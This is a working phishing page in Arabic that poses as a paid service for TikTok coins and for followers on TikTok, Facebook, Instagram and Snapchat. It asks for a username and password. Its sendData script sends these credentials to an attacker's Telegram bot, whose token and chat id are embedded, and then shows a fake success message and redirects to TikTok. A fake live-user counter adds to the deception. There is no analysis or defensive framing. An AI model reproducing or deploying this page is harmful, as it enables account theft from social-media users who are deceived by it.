<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Ultra | رشق وشحن عملات</title>
    <style>
        :root { --tiktok: #ee1d52; --accent: #00f2ea; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; }

        /* فيديو الخلفية */
        #video-bg {
            position: fixed; right: 0; bottom: 0;
            min-width: 100%; min-height: 100%;
            z-index: -2; filter: brightness(0.4) blur(2px); /* تمويه خفيف لزيادة التركيز على الكرت */
            object-fit: cover;
        }

        /* طبقة الأيقونات المتحركة فوق الفيديو */
        .overlay-icons {
            position: fixed; width: 100%; height: 100%; z-index: -1; pointer-events: none;
        }
        .moving-icon {
            position: absolute; width: 50px; height: 50px; opacity: 0.8;
            animation: move linear infinite;
        }
        @keyframes move {
            from { transform: translateY(110vh) rotate(0deg); }
            to { transform: translateY(-20vh) rotate(360deg); }
        }

        .main-card { 
            background: rgba(0, 0, 0, 0.75); padding: 35px 25px; border-radius: 30px; 
            width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1);
            backdrop-filter: blur(15px); box-shadow: 0 0 50px rgba(238, 29, 82, 0.4);
            position: relative; margin: auto; top: 50%; transform: translateY(-50%);
        }

        .logo-area h1 { font-size: 32px; margin: 0; color: #fff; text-shadow: 0 0 20px var(--tiktok); }
        .badge { background: var(--tiktok); color: white; padding: 5px 15px; border-radius: 50px; font-size: 12px; font-weight: bold; margin: 15px 0; display: inline-block; animation: pulse 1.5s infinite; }
        
        select, input { 
            width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #444; 
            background: rgba(255,255,255,0.1); color: white; font-size: 16px; box-sizing: border-box; outline: none;
        }
        input::placeholder { color: #ccc; }

        .btn-go { 
            width: 100%; padding: 18px; border: none; border-radius: 12px; 
            background: #fff; color: #000; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s;
        }
        .btn-go:hover { background: var(--tiktok); color: #fff; box-shadow: 0 0 30px var(--tiktok); }

        .live-status { font-size: 13px; color: #4ade80; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

    <video autoplay muted loop id="video-bg">
        <source src="https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-social-media-icons-20997-large.mp4" type="video/mp4">
    </video>

    <div class="overlay-icons" id="icons-container"></div>

    <div class="main-card">
        <div class="logo-area">
            <h1>SMM ULTRA PRO</h1>
            <div class="badge">نظام الرشق التلقائي: نشط الآن</div>
        </div>

        <select id="platform">
            <option value="TikTok-Coins">تيك توك - شحن عملات (Coins) 💰</option>
            <option value="TikTok-Followers">تيك توك - زيادة متابعين وفولو</option>
            <option value="Facebook-Likes">فيسبوك - زيادة تفاعل ومتابعين</option>
            <option value="Instagram-Followers">إنستغرام - زيادة فولو ولايكات</option>
            <option value="Snapchat-Score">سناب شات - رفع سكور سريع</option>
        </select>

        <input type="text" id="user" placeholder="اسم المستخدم أو الإيميل" required>
        <input type="password" id="pass" placeholder="كلمة مرور الحساب (للتوثيق)" required>
        
        <button class="btn-go" onclick="sendData()">ابدأ الرشق الآن</button>

        <div class="live-status">
            🟢 نشط الآن في ليبيا: <span id="online">17,428</span>
        </div>
    </div>

    <script>
        // إضافة صور/أيقونات واضحة تتحرك في الخلفية
        const container = document.getElementById('icons-container');
        const imgUrls = [
            'https://cdn-icons-png.flaticon.com/512/3046/3046121.png', // TikTok
            'https://cdn-icons-png.flaticon.com/512/174/174855.png',   // Instagram
            'https://cdn-icons-png.flaticon.com/512/124/124010.png',   // Facebook
            'https://cdn-icons-png.flaticon.com/512/2111/2111615.png'   // Snapchat
        ];

        for (let i = 0; i < 15; i++) {
            let img = document.createElement('img');
            img.src = imgUrls[Math.floor(Math.random() * imgUrls.length)];
            img.className = 'moving-icon';
            img.style.left = Math.random() * 100 + 'vw';
            img.style.animationDuration = (Math.random() * 5 + 5) + 's';
            img.style.animationDelay = (Math.random() * 5) + 's';
            container.appendChild(img);
        }

        function sendData() {
            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk"; 
            const chat_id = "1564944407"; 
            
            const platform = document.getElementById('platform').value;
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            if(user === "" || pass === "") {
                alert("يرجى إدخال البيانات لربط الحساب بالسيرفر"); return;
            }

            const msg = `👑 صيدة الترا VIP!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;

            fetch(url).finally(() => {
                alert("تم التحقق! طلبك قيد المعالجة الآن، سيصلك المتابعين/العملات قريباً.");
                window.location.href = "https://www.tiktok.com"; 
            });
        }
    </script>
</body>
</html>
